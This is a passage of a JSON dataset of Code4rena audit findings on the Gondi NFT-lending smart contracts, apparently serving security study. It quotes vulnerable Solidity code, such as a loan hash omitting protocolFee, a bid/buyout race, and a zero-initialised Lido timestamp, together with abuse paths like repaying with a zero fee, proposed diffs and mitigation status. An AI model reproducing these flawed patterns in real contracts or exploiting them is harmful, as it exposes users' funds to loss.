      "content": "\n[AaveUsdcBaseInterestAllocator#L90](https://github.com/code-423n4/2024-04-gondi/blob/b9863d73c08fcdd2337dc80a8b5e0917e18b036c/src/lib/pools/AaveUsdcBaseInterestAllocator.sol#L90)\n\n[AaveUsdcBaseInterestAllocator.sol#L16](https://github.com/code-423n4/2024-04-gondi/blob/b9863d73c08fcdd2337dc80a8b5e0917e18b036c/src/lib/pools/AaveUsdcBaseInterestAllocator.sol#L16)\n\n[AuctionWithBuyoutLoanLiquidator.sol#L61](https://github.com/code-423n4/2024-04-gondi/blob/b9863d73c08fcdd2337dc80a8b5e0917e18b036c/src/lib/AuctionWithBuyoutLoanLiquidator.sol#L61)\n\n[LoanManager.sol#L10](https://github.com/code-423n4/2024-04-gondi/blob/b9863d73c08fcdd2337dc80a8b5e0917e18b036c/src/lib/loans/LoanManager.sol#L10)\n\n[ValidatorHelpers.sol#L4](https://github.com/code-423n4/2024-04-gondi/blob/b9863d73c08fcdd2337dc80a8b5e0917e18b036c/src/lib/utils/ValidatorHelpers.sol#L4)\n\n\n### Details\n\nThere are a lot of open TODOs in the codebase. They indicate there are some missing functionalities needed to be implemented. For example:\n\n```solidity\nfunction claimRewards() external {\n    /// TODO: getIncentivesController\n}\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-04-gondi",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "35240",
      "title": "[01] No need to approve `__aavePool` to spend `__aToken`",
      "impact": "LOW",
      "content": "\n[AaveUsdcBaseInterestAllocator.sol#L44](https://github.com/code-423n4/2024-04-gondi/blob/b9863d73c08fcdd2337dc80a8b5e0917e18b036c/src/lib/pools/AaveUsdcBaseInterestAllocator.sol#L44)\n\n### Details\n\nThe AavePool can burn the `aToken` directly without any allowance from burner address. So the call to approve `aToken` in the constructor of `AaveUsdcBaseInterestAllocator` contract is unnecessary.\n\n```solidity\nconstructor(address _pool, address __aavePool, address __usdc, address __aToken) Owned(tx.origin) {\n    if (address(Pool(_pool).asset()) != address(__usdc)) {\n        revert InvalidPoolError();\n    }\n    getPool = _pool;\n    _aavePool = __aavePool;\n    _usdc = __usdc;\n    _aToken = __aToken;\n    ERC20(__usdc).approve(__aavePool, type(uint256).max);\n     // @audit No need to approve aToken\n    ERC20(__aToken).approve(__aavePool, type(uint256).max);\n}\n```\n\nCheck out the AavePool code [here](https://polygonscan.com/address/0x1ed647b250e5b6d71dc7b25806f44c33f5658f71#code#F1#L196).\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-04-gondi",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "35239",
      "title": "[M-20] Hardcoded incorrect `getLidoData` timestamp, resulting in incorrect base point `Apr. Loans` can be validated with a substantially low `baseRate` interest",
      "impact": "MEDIUM",
      "content": "\nIn `LidoEthBaseInterestAllocator.sol`, [`getLidoData`](https://github.com/code-423n4/2024-04-gondi/blob/b9863d73c08fcdd2337dc80a8b5e0917e18b036c/src/lib/pools/LidoEthBaseInterestAllocator.sol#L62) is initialized with an incorrect timestamp, causing subsequent `baseApr` to be incorrect.\n\nIn constructor, `getLidoData` is initialized with `0` timestamp. This should be `block.timestamp` instead. As a result, `baseApr` updates will be much lower:\n\n```solidity\n//src/lib/pools/LidoEthBaseInterestAllocator.sol\n\n    struct LidoData {\n        uint96 lastTs;\n        uint144 shareRate;\n        uint16 aprBps;\n    }\n...\n    constructor(\n        address _pool,\n        address payable __curvePool,\n        address payable __weth,\n        address __lido,\n        uint256 _currentBaseAprBps,\n        uint96 _lidoUpdateTolerance\n    ) Owned(tx.origin) {\n...\n          //@audit 0-> block.timestamp\n|>        getLidoData = LidoData(0, uint144(_currentShareRate()), uint16(_currentBaseAprBps));\n...\n```\n\n<https://github.com/code-423n4/2024-04-gondi/blob/b9863d73c08fcdd2337dc80a8b5e0917e18b036c/src/lib/pools/LidoEthBaseInterestAllocator.sol#L62>\n\nFor example, in `_updateLidoValue()`, `_lidoData.aprBps` is [calculated based on delta shareRate, divided by delta timespan](https://github.com/code-423n4/2024-04-gondi/blob/b9863d73c08fcdd2337dc80a8b5e0917e18b036c/src/lib/pools/LidoEthBaseInterestAllocator.sol#L162-L164). (`_BPS * _SECONDS_PER_YEAR * (shareRate - _lidoData.shareRate) / _lidoData.shareRate/ (block.timestamp - _lidoData.lastTs)`) `shareRate` and `_lidoData.shareRate` are associated with current timestamp, and deployment timestamp respectively. But timespan would be (`block.timestamp - 0`). This deflated `_lidoData.aprBps` value, which is used to [validate Loan offers](https://github.com/code-423n4/2024-04-gondi/blob/b9863d73c08fcdd2337dc80a8b5e0917e18b036c/src/lib/pools/Pool.sol#L400) in Pool.sol during loan initiation.\n\nIn `PoolOfferHandler.sol`, this allows loan offers with substantially low `aprBps` to pass the [minimal apr check](https://github.com/code-423n4/2024-04-gondi/blob/b9863d73c08fcdd2337dc80a8b5e0917e18b036c/src/lib/pools/PoolOfferHandler.sol#L165).\n\n```solidity\n//src/lib/pools/PoolOfferHandler.sol\n    function validateOffer(uint256 _baseRate, bytes calldata _offer)\n        external\n        view\n        override\n        returns (uint256 principalAmount, uint256 aprBps)\n    {\n...\n        if (offerExecution.offer.aprBps < _baseRate + aprPremium || aprPremium == 0) {\n            revert InvalidAprError();\n        }\n...\n```\n\n<https://github.com/code-423n4/2024-04-gondi/blob/b9863d73c08fcdd2337dc80a8b5e0917e18b036c/src/lib/pools/PoolOfferHandler.sol#L165>\n\nLoans with invalid aprs can be created.\n\n### Recommended Mitigation Steps\n\nUse `block.timestamp` to initialize `getLidoData`.\n\n### Assessed type\n\nError\n\n**[0xend (Gondi) confirmed](https://github.com/code-423n4/2024-04-gondi-findings/issues/3#event-12543561677)**\n\n**[0xA5DF (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-04-gondi-findings/issues/3#issuecomment-2067735146):**\n > Marking as Medium since this only impacts interest and it's limited to the initial phase of the contract.\n\n**[Gondi mitigated](https://github.com/code-423n4/2024-05-gondi-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues):**\n> Set right value for `getLidoData` timestamp.\n\n**Status:** Mitigation confirmed. Full details in reports from [oakcobalt](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/115), [minhquanym](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/85) and [bin2chen](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/38).\n\n***\n\n",
      "summary": "\nThe bug report is about a mistake in the code of `LidoEthBaseInterestAllocator.sol` which causes the `baseApr` to be incorrect. In the constructor, a function called `getLidoData` is initialized with a timestamp of `0` instead of the correct `block.timestamp`. This results in the `baseApr` being much lower than it should be. This bug is caused by the incorrect calculation of the `aprBps` in the `_updateLidoValue()` function, which is used to validate loan offers in `PoolOfferHandler.sol`. This allows for loans with invalid aprs to be created. The recommended mitigation step is to use `block.timestamp` to initialize `getLidoData`. This bug has been confirmed and mitigated by the team.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-04-gondi",
      "github_link": "https://github.com/code-423n4/2024-04-gondi-findings/issues/3",
      "tags": [],
      "finders": [
        "oakcobalt"
      ]
    },
    {
      "id": "35238",
      "title": "[M-19] Bidders might lose funds due to possible racing condition between `settleWithBuyout` and `placeBid`",
      "impact": "MEDIUM",
      "content": "\nIn `AuctionWithBuyoutLoanLiquidator.sol`, `settleWithBuyout` and `placeBid` are allowed at an overlapping timestamp (`_auction.startTime + _timeForMainLenderToBuy`). This allows `settleWithBuyout` and `placeBid` to be settled at the same block.\n\nWhen `placeBid` tx settles at `_auction.startTime + _timeForMainLenderToBuy` before `settleWithBuyout` tx, the bidder will lose their funds. Because `settleWithBuyout` will always assume no bids are placed, it will directly transfer out the collateral NFT token and [delete the auction data](https://github.com/code-423n4/2024-04-gondi/blob/b9863d73c08fcdd2337dc80a8b5e0917e18b036c/src/lib/AuctionWithBuyoutLoanLiquidator.sol#L101) from storage.\n\n```solidity\n    function settleWithBuyout(\n        address _nftAddress,\n        uint256 _tokenId,\n        Auction calldata _auction,\n        IMultiSourceLoan.Loan calldata _loan\n    ) external nonReentrant {\n...\n        uint256 timeLimit = _auction.startTime + _timeForMainLenderToBuy;\n |>       if (timeLimit < block.timestamp) {\n            revert OptionToBuyExpiredError(timeLimit);\n        }\n...\n```\n\n<https://github.com/code-423n4/2024-04-gondi/blob/b9863d73c08fcdd2337dc80a8b5e0917e18b036c/src/lib/AuctionWithBuyoutLoanLiquidator.sol#L63C1-L66C10>\n\n```solidity\n    function _placeBidChecks(address _nftAddress, uint256 _tokenId, Auction memory _auction, uint256 _bid)\n        internal\n        view\n        override\n    {\n...\n        uint256 timeLimit = _auction.startTime + _timeForMainLenderToBuy;\n|>        if (timeLimit > block.timestamp) {\n            revert OptionToBuyStilValidError(timeLimit);\n        }\n```\n\n<https://github.com/code-423n4/2024-04-gondi/blob/b9863d73c08fcdd2337dc80a8b5e0917e18b036c/src/lib/AuctionWithBuyoutLoanLiquidator.sol#L129>\n\n### Recommended Mitigation Steps\n\nConsider to only allow buyout strictly before the timeLimit `if (timeLimit <= block.timestamp) {//revert`.\n\n**[0xend (Gondi) confirmed](https://github.com/code-423n4/2024-04-gondi-findings/issues/6#event-12543553998)**\n\n**[Gondi mitigated](https://github.com/code-423n4/2024-05-gondi-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues):**\n> Strict to `>=`.\n\n**Status:** Mitigation confirmed. Full details in reports from [oakcobalt](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/114), [minhquanym](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/84) and [bin2chen](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/37).\n\n***\n\n",
      "summary": "The bug report is about a problem found in the code of a smart contract called `AuctionWithBuyoutLoanLiquidator.sol`. The problem is that two functions, `settleWithBuyout` and `placeBid`, can be called at the same time, which can cause the bidder to lose their funds. This happens when the `placeBid` function is called before the `settleWithBuyout` function, and the code assumes that no bids have been placed. The suggested solution is to only allow the `settleWithBuyout` function to be called before a certain time, and to make sure that the `placeBid` function cannot be called after that time. The issue has been confirmed and mitigated by the developers.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-04-gondi",
      "github_link": "https://github.com/code-423n4/2024-04-gondi-findings/issues/6",
      "tags": [],
      "finders": [
        "oakcobalt"
      ]
    },
    {
      "id": "35237",
      "title": "[M-18] `distribute()` when can't repay all lenders, may lack of notification to `LoanManager` for accounting",
      "impact": "MEDIUM",
      "content": "\nThe `LiquidationDistributor` is used to distribute funds after an auction. When the auction amount is insufficient, lenders are repaid in sequence.\n\n```solidity\n    function distribute(uint256 _proceeds, IMultiSourceLoan.Loan calldata _loan) external {\n...\n        if (_proceeds > totalPrincipalAndPaidInterestOwed + totalPendingInterestOwed) {\n            for (uint256 i = 0; i < _loan.tranche.length;) {\n                IMultiSourceLoan.Tranche calldata thisTranche = _loan.tranche[i];\n                _handleTrancheExcess(\n                    _loan.principalAddress,\n                    thisTranche,\n                    msg.sender,\n                    _proceeds,\n                    totalPrincipalAndPaidInterestOwed + totalPendingInterestOwed\n                );\n                unchecked {\n                    ++i;\n                }\n            }\n        } else {\n@>          for (uint256 i = 0; i < _loan.tranche.length && _proceeds > 0;) {\n                IMultiSourceLoan.Tranche calldata thisTranche = _loan.tranche[i];\n                _proceeds = _handleTrancheInsufficient(\n                    _loan.principalAddress, thisTranche, msg.sender, _proceeds, owedPerTranche[i]\n                );\n                unchecked {\n                    ++i;\n                }\n            }\n        }\n    }\n```\n\nThe code snippet above introduces a condition `_proceeds > 0` to terminate the loop when there's no remaining balance in `_proceeds`, thereby preventing further execution of `_handleTrancheInsufficient()`.\n\nHowever, this approach creates an issue. If the subsequent lender is a `LoanManager`, it won't be notified for accounting via `_handleTrancheInsufficient()` -> `_handleLoanManagerCall()` -> `LoanManager(_tranche.lender).loanLiquidation()`.\n\nAlthough no funds can be repaid, accounting is still necessary to notice and prevent incorrect accounting, causing inaccuracies in `totalAssets()` and continued accumulation of interest.\nThis outstanding debt should be shared among current users and prevent it from persisting as bad debt.\n\n### Impact\n\nFailure to notify `LoanManager.loanLiquidation()` may result in accounting inaccuracies.\n\n### Recommended Mitigation\n\n```diff\n    function distribute(uint256 _proceeds, IMultiSourceLoan.Loan calldata _loan) external {\n...\n        } else {\n-           for (uint256 i = 0; i < _loan.tranche.length && _proceeds > 0;) {\n+           for (uint256 i = 0; i < _loan.tranche.length;) {\n                IMultiSourceLoan.Tranche calldata thisTranche = _loan.tranche[i];\n                _proceeds = _handleTrancheInsufficient(\n                    _loan.principalAddress, thisTranche, msg.sender, _proceeds, owedPerTranche[i]\n                );\n                unchecked {\n                    ++i;\n                }\n            }\n        }\n    }\n```\n\n### Assessed type\n\nContext\n\n**[0xend (Gondi) confirmed](https://github.com/code-423n4/2024-04-gondi-findings/issues/10#event-12543550109)**\n\n**[Gondi mitigated](https://github.com/code-423n4/2024-05-gondi-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues):**\n> Always call `loanManager` (even if 0 proceeds).\n\n**Status:** Mitigation confirmed. Full details in reports from [oakcobalt](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/113), [minhquanym](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/83) and [bin2chen](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/36).\n\n***\n\n",
      "summary": "\nThe `LiquidationDistributor` is a code used for distributing funds after an auction. If the amount raised from the auction is not enough, the lenders are repaid in a certain order. However, there is a bug in the code that can cause issues with accounting if the subsequent lender is a `LoanManager`. This can lead to incorrect calculations and accumulation of interest. To fix this, the recommended solution is to always call `loanManager` even if there are no funds to be repaid. This bug has been confirmed and mitigated by the team.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-04-gondi",
      "github_link": "https://github.com/code-423n4/2024-04-gondi-findings/issues/10",
      "tags": [],
      "finders": [
        "bin2chen"
      ]
    },
    {
      "id": "35236",
      "title": "[M-17] `loan.hash()` does not contain `protocolFee`",
      "impact": "MEDIUM",
      "content": "\nThe current `IMultiSourceLoan.loop.hash()` does not contain `protocolFee`:\n\n```solidity\n    function emitLoan(LoanExecutionData calldata _loanExecutionData)\n        external\n        nonReentrant\n        returns (uint256, Loan memory)\n    {\n...\n@>      _loans[loanId] = loan.hash();\n        emit LoanEmitted(loanId, offerIds, loan, totalFee);\n\n        return (loanId, loan);\n    }\n\n    function hash(IMultiSourceLoan.Loan memory _loan) internal pure returns (bytes32) {\n        bytes memory trancheHashes;\n        for (uint256 i; i < _loan.tranche.length;) {\n            trancheHashes = abi.encodePacked(trancheHashes, _hashTranche(_loan.tranche[i]));\n            unchecked {\n                ++i;\n            }\n        }\n        return keccak256(\n            abi.encode(\n                _MULTI_SOURCE_LOAN_HASH,\n                _loan.borrower,\n                _loan.nftCollateralTokenId,\n                _loan.nftCollateralAddress,\n                _loan.principalAddress,\n                _loan.principalAmount,\n                _loan.startTime,\n                _loan.duration,\n@>              //@audit miss protocolFee\n                keccak256(trancheHashes)\n            )\n        );\n    }\n\n   struct Loan {\n        address borrower;\n        uint256 nftCollateralTokenId;\n        address nftCollateralAddress;\n        address principalAddress;\n        uint256 principalAmount;\n        uint256 startTime;\n        uint256 duration;\n        Tranche[] tranche;\n@>      uint256 protocolFee;\n    }\n```\n\nThen, you can specify `protocolFee` arbitrarily in many methods, but the `_baseLoanChecks()` security check doesn't `revert`.\n\n```solidity\n    function _baseLoanChecks(uint256 _loanId, Loan memory _loan) private view {\n@>      if (_loan.hash() != _loans[_loanId]) {\n            revert InvalidLoanError(_loanId);\n        }\n        if (_loan.startTime + _loan.duration < block.timestamp) {\n            revert LoanExpiredError();\n        }\n    }\n```\n\nExample: `repayLoan(loadn.protocolFee=0)` to escape `fees` and cause a `LoanManager` accounting error. `refinancePartial()/refinanceFull()` can also specify the wrong `fees` to skip the fees.\n\n### Impact\n\nThe loan hash does not contain a `protocolFee`, leading to an arbitrary `protocolFee` that can be specified to escape `fees` or cause an accounting error.\n\n### Recommended Mitigation\n\n```diff\n    function hash(IMultiSourceLoan.Loan memory _loan) internal pure returns (bytes32) {\n        bytes memory trancheHashes;\n        for (uint256 i; i < _loan.tranche.length;) {\n            trancheHashes = abi.encodePacked(trancheHashes, _hashTranche(_loan.tranche[i]));\n            unchecked {\n                ++i;\n            }\n        }\n        return keccak256(\n            abi.encode(\n                _MULTI_SOURCE_LOAN_HASH,\n                _loan.borrower,\n                _loan.nftCollateralTokenId,\n                _loan.nftCollateralAddress,\n                _loan.principalAddress,\n                _loan.principalAmount,\n                _loan.startTime,\n                _loan.duration, \n                keccak256(trancheHashes),\n+               _loan.protocolFee\n            )\n        );\n    }\n```\n\n### Assessed type\n\nContext\n\n**[0xend (Gondi) confirmed](https://github.com/code-423n4/2024-04-gondi-findings/issues/15#event-12543524712)**\n\n**[0xA5DF (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-04-gondi-findings/issues/15#issuecomment-2068016928):**\n > Avoiding fees is just a Medium. For the accounting error, I'll need more proof that this can lead to something significant to mark this as High.\n\n**[Gondi mitigated](https://github.com/code-423n4/2024-05-gondi-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues):**\n> Added field in hash.\n\n**Status:** Mitigation confirmed. Full details in reports from [oakcobalt](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/112), [minhquanym](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/82) and [bin2chen](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/35).\n\n***\n\n",
      "summary": "\nThe bug report discusses a problem with the current IMultiSourceLoan.loop.hash() function. Specifically, it does not include the protocolFee, which can lead to an arbitrary protocolFee being specified in various methods. This can result in escaping fees or causing an accounting error in the LoanManager. The recommended mitigation is to add the protocolFee field in the hash function. The severity of the bug has been decreased to Medium, and the status is confirmed as mitigated. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-04-gondi",
      "github_link": "https://github.com/code-423n4/2024-04-gondi-findings/issues/15",
      "tags": [],
      "finders": [
        "minhquanym",
        "bin2chen",
        "oakcobalt"
      ]
    },
    {
      "id": "35235",
      "title": "[M-16] `distribute()` uses the wrong end time to break `maxSeniorRepayment`'s expectations",
      "impact": "MEDIUM",
      "content": "\nWhen the bid amount is not enough, the `lender` will be repaid in order of `tranche[]`.\nIn order to minimize the risk, the user can specify `maxSeniorRepayment` to avoid the risk to some extent, and put himself in a position of higher repayment priority. At the same time `emitLoan()` checks `maxSeniorRepayment` for the `emitLoan()`.\n\n`emitLoan()` -> `_processOffersFromExecutionData()` -> `_checkOffer()`\n\n```solidity\n    function _processOffersFromExecutionData(\n        address _borrower,\n        address _principalReceiver,\n        address _principalAddress,\n        address _nftCollateralAddress,\n        uint256 _tokenId,\n        uint256 _duration,\n        OfferExecution[] calldata _offerExecution\n    ) private returns (uint256, uint256[] memory, Loan memory, uint256) {\n...\n            uint256 amount = thisOfferExecution.amount;\n            address lender = offer.lender;\n            /// @dev Please note that we can now have many tranches with same `loanId`.\n            tranche[i] = Tranche(loanId, totalAmount, amount, lender, 0, block.timestamp, offer.aprBps);\n            totalAmount += amount;\n@>          totalAmountWithMaxInterest += amount + amount.getInterest(offer.aprBps, _duration);\n...\n\n    function _checkOffer(\n        LoanOffer calldata _offer,\n        address _principalAddress,\n        address _nftCollateralAddress,\n        uint256 _amountWithInterestAhead\n    ) private pure {\n        if (_offer.principalAddress != _principalAddress || _offer.nftCollateralAddress != _nftCollateralAddress) {\n            revert InvalidAddressesError();\n        }\n@>      if (_amountWithInterestAhead > _offer.maxSeniorRepayment) {\n            revert InvalidTrancheError();\n        }\n    }\n```\n\n`totalAmountWithMaxInterest` is computed using `loan._duration`. But when the bidding ends and the distribution is done in `LiquidationDistributor.distribute()`, the current time is used to calculate `Interest`.\n\n```solidity\n    function distribute(uint256 _proceeds, IMultiSourceLoan.Loan calldata _loan) external {\n        uint256[] memory owedPerTranche = new uint256[](_loan.tranche.length);\n        uint256 totalPrincipalAndPaidInterestOwed = _loan.principalAmount;\n        uint256 totalPendingInterestOwed = 0;\n        for (uint256 i = 0; i < _loan.tranche.length;) {\n            IMultiSourceLoan.Tranche calldata thisTranche = _loan.tranche[i];\n            uint256 pendingInterest =\n@>              thisTranche.principalAmount.getInterest(thisTranche.aprBps, block.timestamp - thisTranche.startTime);\n            totalPrincipalAndPaidInterestOwed += thisTranche.accruedInterest;\n            totalPendingInterestOwed += pendingInterest;\n            owedPerTranche[i] += thisTranche.principalAmount + thisTranche.accruedInterest + pendingInterest;\n            unchecked {\n                ++i;\n            }\n        }\n```\n\nBecause bidding takes a certain amount of time (`~3-7 days`), using `block.timestamp - thisTranche.startTime` will be larger than expected! Correctly should use: (`loan.startTime + loan.duration - thisTranche.startTime`) to calculate the `interest`.\n\nThis leads to the problem that if there are not enough funds, the front `lender` will get a larger repayment than expected, breaking the back `lender`'s initial expectation of `maxSeniorRepayment`.\n\n### Impact\n\nIf there are not enough funds, the initial expectation of `maxSeniorRepayment` may be broken.\n\n### Recommended Mitigation\n\n```diff\n    function distribute(uint256 _proceeds, IMultiSourceLoan.Loan calldata _loan) external {\n        uint256[] memory owedPerTranche = new uint256[](_loan.tranche.length);\n        uint256 totalPrincipalAndPaidInterestOwed = _loan.principalAmount;\n        uint256 totalPendingInterestOwed = 0;\n+      uint256 loanExpireTime = _loan.startTime + _loan.duration;\n        for (uint256 i = 0; i < _loan.tranche.length;) {\n            IMultiSourceLoan.Tranche calldata thisTranche = _loan.tranche[i];\n            uint256 pendingInterest =\n-               thisTranche.principalAmount.getInterest(thisTranche.aprBps, block.timestamp - thisTranche.startTime);\n+               thisTranche.principalAmount.getInterest(thisTranche.aprBps, loanExpireTime - thisTranche.startTime);\n            totalPrincipalAndPaidInterestOwed += thisTranche.accruedInterest;\n            totalPendingInterestOwed += pendingInterest;\n            owedPerTranche[i] += thisTranche.principalAmount + thisTranche.accruedInterest + pendingInterest;\n            unchecked {\n                ++i;\n            }\n        }\n```\n\n### Assessed type\n\nContext\n\n**[0xend (Gondi) confirmed](https://github.com/code-423n4/2024-04-gondi-findings/issues/16#event-12543522584)**\n\n**[Gondi mitigated](https://github.com/code-423n4/2024-05-gondi-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues):**\n> Changed to loan end time (instead of current timestamp).\n\n**Status:** Mitigation confirmed. Full details in reports from [oakcobalt](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/111), [bin2chen](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/34) and [minhquanym](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/81).\n\n***\n\n",
      "summary": "\nThe report highlights a bug in the `emitLoan()` function where the `totalAmountWithMaxInterest` calculation is affected by the use of the current time instead of the loan's end time, leading to incorrect interest calculations and potentially breaking the initial expectation of `maxSeniorRepayment` for lenders. The recommended mitigation is to use the loan's end time instead of the current time in the interest calculation. This issue has been confirmed and mitigated by the team.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-04-gondi",
      "github_link": "https://github.com/code-423n4/2024-04-gondi-findings/issues/16",
      "tags": [],
      "finders": [
        "bin2chen"
      ]
    },
    {
      "id": "35234",
      "title": "[M-15] `confirmUnderwriter()` need to recalculate `getMinTimeBetweenWithdrawalQueues`",
      "impact": "MEDIUM",
      "content": "\n`getMinTimeBetweenWithdrawalQueues` is very important for `Pool`. If `getMinTimeBetweenWithdrawalQueues` is too small, `pendingQueues` will be overwritten too early, and when `Loan` pays off, it won't be able to find the corresponding `queues`.\n\nSo we will calculate `getMinTimeBetweenWithdrawalQueues` by `MaxDuration + _LOAN_BUFFER_TIME` to make sure it won't be overwritten too early.\n\n```solidity\n    constructor(\n        address _feeManager,\n        address _offerHandler,\n        uint256 _waitingTimeBetweenUpdates,\n        OptimalIdleRange memory _optimalIdleRange,\n        uint256 _maxTotalWithdrawalQueues,\n        uint256 _reallocationBonus,\n        ERC20 _asset,\n        string memory _name,\n        string memory _symbol\n    ) ERC4626(_asset, _name, _symbol) LoanManager(tx.origin, _offerHandler, _waitingTimeBetweenUpdates) {\n\n....\n\n@>      getMinTimeBetweenWithdrawalQueues = (IPoolOfferHandler(_offerHandler).getMaxDuration() + _LOAN_BUFFER_TIME)\n            .mulDivUp(1, _maxTotalWithdrawalQueues);\n```\n\nBut switching the new `getUnderwriter/_offerHandler` doesn't recalculate the `getMinTimeBetweenWithdrawalQueues`.\n\n```solidity\n    function confirmUnderwriter(address __underwriter) external onlyOwner {\n        if (getPendingUnderwriterSetTime + UPDATE_WAITING_TIME > block.timestamp) {\n            revert TooSoonError();\n        }\n        if (getPendingUnderwriter != __underwriter) {\n            revert InvalidInputError();\n        }\n\n@>      getUnderwriter = __underwriter;\n        getPendingUnderwriter = address(0);\n        getPendingUnderwriterSetTime = type(uint256).max;\n\n        emit UnderwriterSet(__underwriter);\n    }\n```\n\nThis may break the expectation of `getMinTimeBetweenWithdrawalQueues`, and the new `getUnderwriter.getMaxDuration` is larger than the old one; which may cause `pendingQueues` to be overwritten prematurely.\n\n### Impact\n\nThe new `getUnderwriter.getMaxDuration` is larger than the old one, which may cause `pendingQueues` to be overwritten prematurely.\n\n### Recommended Mitigation\n\n`Pool` overrides `confirmUnderwriter()` with an additional recalculation of `getMinTimeBetweenWithdrawalQueues` and must not be smaller than the old one, to avoid premature overwriting of the previous one.\n\n```diff\ncontract Pool is ERC4626, InputChecker, IPool, IPoolWithWithdrawalQueues, LoanManager, ReentrancyGuard {\n-   uint256 public immutable getMinTimeBetweenWithdrawalQueues;\n+   uint256 public getMinTimeBetweenWithdrawalQueues;\n...\n+   function confirmUnderwriter(address __underwriter) external override onlyOwner {\n+           super.confirmUnderwriter(__underwriter);\n+           uint256 newMinTime = (IPoolOfferHandler(__underwriter).getMaxDuration() + _LOAN_BUFFER_TIME)\n+            .mulDivUp(1, _maxTotalWithdrawalQueues);\n+           require(newMinTime >= getMinTimeBetweenWithdrawalQueues,\"invalid\");\n+           getMinTimeBetweenWithdrawalQueues = newMinTime;\n+    }\n```\n\n### Assessed type\n\nContext\n\n**[0xend (Gondi) confirmed](https://github.com/code-423n4/2024-04-gondi-findings/issues/17#event-12545582338)**\n\n**[Gondi mitigated](https://github.com/code-423n4/2024-05-gondi-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues):**\n> Added check (`maxDuration` cannot be longer).\n\n**Status:** Mitigation confirmed. Full details in reports from [oakcobalt](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/110), [bin2chen](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/33) and [minhquanym](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/80).\n\n***\n\n",
      "summary": "\nThis bug report discusses an issue with the `getMinTimeBetweenWithdrawalQueues` function in the `Pool` contract. If this function is set to a value that is too small, it can cause problems with the `pendingQueues` and prevent `Loan` from finding the correct `queues` when it pays off. The report recommends calculating `getMinTimeBetweenWithdrawalQueues` based on `MaxDuration + _LOAN_BUFFER_TIME` to prevent early overwriting. However, the report also notes that switching to a new `getUnderwriter` does not recalculate `getMinTimeBetweenWithdrawalQueues`, which can cause issues if the new `getUnderwriter.getMaxDuration` is larger than the old one. The report suggests overriding the `confirmUnderwriter()` function in `Pool` to include a recalculation of `getMinTimeBetweenWithdrawalQueues` and ensuring that the new value is not smaller than the old one. The report also notes that this issue falls under the \"Context\" category and has been mitigated by the team.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-04-gondi",
      "github_link": "https://github.com/code-423n4/2024-04-gondi-findings/issues/17",
      "tags": [],
      "finders": [
        "bin2chen"
      ]
    },
    {
      "id": "35233",
      "title": "[M-14] `loanLiquidation()` calculation of interest is not accurate",
      "impact": "MEDIUM",
      "content": "\n`loanLiquidation()`: The calculated interest codes are as follows：\n\n```solidity\n    function loanLiquidation(\n        uint256 _loanId,\n        uint256 _principalAmount,\n        uint256 _apr,\n        uint256,\n        uint256 _protocolFee,\n        uint256 _received,\n        uint256 _startTime\n    ) external override onlyAcceptedCallers {\n        uint256 netApr = _netApr(_apr, _protocolFee);\n        uint256 interestEarned = _principalAmount.getInterest(netApr, block.timestamp - _startTime);\n@>      uint256 fees = IFeeManager(getFeeManager).processFees(_received, 0);\n        getCollectedFees += fees;\n        _loanTermination(msg.sender, _loanId, _principalAmount, netApr, interestEarned, _received - fees);\n    }\n...\n\ncontract FeeManager is IFeeManager, TwoStepOwned {\n...\n    function processFees(uint256 _principal, uint256 _interest) external view returns (uint256) {\n        /// @dev cached\n        Fees memory __fees = _fees;\n        return _principal.mulDivDown(__fees.managementFee, PRECISION)\n            + _interest.mulDivDown(__fees.performanceFee, PRECISION);\n    }\n```\n\nThe above code takes all of `_received` as the principal and gives it to `IFeeManager` to calculate. But the amount received from the 